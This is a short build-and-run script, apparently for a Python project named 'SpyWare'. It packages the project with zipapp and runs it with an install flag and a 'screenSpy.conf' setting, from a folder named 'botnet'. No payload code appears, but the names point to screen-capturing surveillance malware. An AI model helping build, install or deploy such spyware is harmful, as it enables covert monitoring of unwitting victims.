python -m zipapp SpyWare -c -p "/usr/bin/env python3"
move SpyWare.pyz bin/SpyWare.pyz

python bin/SpyWare.pyz -r --install --env "screenSpy.conf=C:\Users\CSU1\Documents\dev\botnet\SpyWare\abc.conf" --enable runonly -s abc.conf
